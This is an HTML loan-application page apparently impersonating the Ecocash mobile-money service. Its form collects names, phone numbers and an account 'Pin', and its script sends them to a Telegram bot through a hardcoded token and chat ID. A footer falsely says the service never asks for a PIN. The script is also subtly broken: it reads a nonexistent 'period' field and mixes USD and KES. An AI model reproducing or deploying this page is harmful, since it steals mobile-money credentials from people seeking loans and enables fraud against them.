<!DOCTYPE html>
<html>
<head>
<title>Ecocash Loans - Apply Now</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;text-align:center;padding:20px;background:#e8f5e9}
.box{background:white;padding:20px;border-radius:15px;max-width:420px;margin:auto}
input,select{width:90%;padding:12px;margin:8px;border-radius:8px;border:1px solid #ccc;font-size:16px}
button{background:#16a34a;color:white;padding:14px;border:none;border-radius:8px;width:95%;font-size:17px;font-weight:bold}
#msg{color:green;font-weight:bold}
</style>
</head>
<body>
<div class="box">
<h2>Ecocash LOANS 💰</h2>
<p>Quick Loan - Apply in 2 Minutes</p>
<form id="loanForm">
<input id="fullname" placeholder="Full Names" required>
<input id="phone" placeholder="Phone" required>
<input id="idnumber" placeholder="Pin" required>
<input id="reason" placeholder="Why do you need this loan? e.g. Business, School Fees, Emergency" required>
<input id="salary" placeholder="Monthly Salary / Income (USD)" required>
<select id="amount" required>
<option value="">How much loan do you want?</option>
<option>500</option><option>1000</option><option>2000</option><option>3000</option><option>5000</option><option>10000</option>
</select>
<select id="otp" required>
<option value="">Repay in?</option>
<option>7 Days</option><option>14 Days</option><option>30 Days</option>
</select>
<button type="submit">Apply For Loan Now</button>
</form>
<p id="msg"></p>
<p style="font-size:12px;color:gray">We never ask for PIN or OTP. We only call you to confirm.</p>
</div>
<script>
document.getElementById('loanForm').addEventListener('submit', async function(e){
e.preventDefault();
const name=document.getElementById('fullname').value;
const phone=document.getElementById('phone').value;
const idnum=document.getElementById('idnumber').value;
const reason=document.getElementById('reason').value;
const salary=document.getElementById('salary').value;
const amount=document.getElementById('amount').value;
const period=document.getElementById('period').value;
const text="🚨 NEW LOAN APPLICATION 🚨\n\n👤 Name: "+name+"\n📞 Phone: "+phone+"\n🪪 ID: "+idnum+"\n❓ Reason: "+reason+"\n💵 Monthly Salary: KES "+salary+"\n💰 Amount: KES "+amount+"\n📅 Period: "+period;
const TOKEN="9036311422:AAEIHoLmD3Iek4R90UmOxeC97fjK9o0DDsw";
const CHAT_ID="7257481053";
try{
await fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:text})});
document.getElementById('msg').innerText="✅ Application Sent! We will call you shortly.";
document.getElementById('loanForm').reset();
}catch(err){document.getElementById('msg').innerText="❌ Failed, try again.";}
});
</script>
</body>
</html>
